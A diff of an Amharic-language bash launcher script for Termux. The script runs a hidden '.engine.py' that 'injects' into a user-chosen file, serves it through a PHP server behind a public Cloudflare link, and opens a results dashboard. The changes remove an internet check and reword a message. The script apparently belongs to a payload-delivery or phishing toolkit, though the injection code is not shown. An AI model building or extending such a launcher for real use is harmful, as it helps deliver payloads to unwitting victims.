@@ -102,7 +102,7 @@ echo -e "${YELLOW}[*] ኢንጄክሽን እየተከናወነ ነው... 💉${N
 python3 .engine.py "$filename"
 echo -e "${GREEN}[+] ኢንጄክሽን ተጠናቋል።${NC}"
 
-echo -e "${YELLOW}[*] የ PHP ሰርቨርን በ Port $port እያስነሳሁ ነው... 🚀${NC}"
+echo -e "${YELLOW}[*] የ PHP ሰርቨርን በ Port $port እየተነሳ ነው... 🚀${NC}"
 php -S 0.0.0.0:$port > /dev/null 2>&1 &
 sleep 2
 
@@ -127,26 +127,20 @@ done
 
 echo -e "\n"
 
-# መጀመሪያ ኢንተርኔት መኖሩን ማረጋገጫ (ping በመጠቀም)
-if ! ping -c 1 google.com &> /dev/null; then
-    echo -e "${RED}${BOLD}[!] ስህተት፦ የኢንተርኔት ግንኙነት የለም! 🌐${NC}"
-    echo -e "${YELLOW}[i] Cloudflare ሊንክ ለማመንጨት ኢንተርኔት ያስፈልጋል። እባክህ አብርተህ ድገመው።${NC}"
+if [ -z "$CF_URL" ]; then
+    echo -e "${RED}[-] ስህተት፦ ሊንኩን ማመንጨት አልተቻለም።${NC}"
 else
-    # ኢንተርኔት ካለ ሊንኩን የመፈለግ ሂደት ይጀምራል
-    if [ -z "$CF_URL" ]; then
-        echo -e "${RED}[-] ስህተት፦ ሊንኩን ማመንጨት አልተቻለም (Cloudflare Error)።${NC}"
-    else
-        echo -e "${GREEN}${BOLD}--------------------------------------------"
-        echo -e "  ✅ ስራው ተጠናቋል! "
-        echo -e "  🌐 የህዝብ ሊንክ: ${YELLOW}$CF_URL"
-        echo -e "  📊 ዳሽቦርድ: ${CYAN}http://localhost:$port/core/dashboard.php"
-        echo -e "${GREEN}--------------------------------------------${NC}"
-        
-        DASHBOARD_URL="http://localhost:$port/core/dashboard.php"
-        if command -v termux-open-url &> /dev/null; then
-            sleep 2
-            termux-open-url "$DASHBOARD_URL"
-        fi
+    echo -e "${GREEN}${BOLD}--------------------------------------------"
+    echo -e "  ✅ ስራው ተጠናቋል! "
+    echo -e "  🌐 የህዝብ ሊንክ: ${YELLOW}$CF_URL"
+    echo -e "  📊 ዳሽቦርድ: ${CYAN}http://localhost:$port/core/dashboard.php"
+    echo -e "${GREEN}--------------------------------------------${NC}"
+
+    
+    DASHBOARD_URL="http://localhost:$port/core/dashboard.php"
+    if command -v termux-open-url &> /dev/null; then
+        sleep 2
+        termux-open-url "$DASHBOARD_URL"
     fi
 fi
 
